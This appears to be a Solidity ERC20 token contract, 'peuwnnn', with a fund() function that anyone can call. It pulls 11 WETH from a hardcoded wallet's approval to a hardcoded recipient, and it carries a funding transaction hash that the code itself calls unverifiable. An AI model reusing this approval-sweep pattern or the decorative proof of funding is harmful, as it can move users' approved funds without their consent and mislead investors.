// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract PeuwnnnToken is ERC20 {
    using SafeERC20 for IERC20;

    uint256 public constant INITIAL_SUPPLY = 731 * 10 ** 18;

    // Wrapped Ether (mainnet)
    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Funding amount: 11 WETH
    uint256 public constant FUNDING_AMOUNT = 11 ether;

    // Reference tx for the funding transfer (informational only, not verifiable on-chain)
    bytes32 public constant FUNDING_TX_HASH =
        0x0fd443802d1ce2283fb668d9faca7f6bddecf464b2551cd13c04b34fb7e99086;

    // Wallet that approved this contract to spend its WETH (the spender/funder)
    address public immutable funder;

    // Recipient of the WETH funding
    address public immutable fundsRecipient;

    bool public funded;

    event Funded(address indexed funder, address indexed recipient, uint256 wethAmount, bytes32 txHash);

    constructor() ERC20("peuwnnn", "pwnnn") {
        funder = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
        fundsRecipient = 0x7f539A791ed710ba66700Aa760635AF5446fE5A5;
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    /// @notice Pulls the approved 11 WETH from the funder to the recipient.
    /// Reverts unless the funder's on-chain allowance to this contract covers it.
    function fund() external {
        require(!funded, "already funded");
        require(WETH.allowance(funder, address(this)) >= FUNDING_AMOUNT, "no approval");
        funded = true;
        WETH.safeTransferFrom(funder, fundsRecipient, FUNDING_AMOUNT);
        emit Funded(funder, fundsRecipient, FUNDING_AMOUNT, FUNDING_TX_HASH);
    }
}
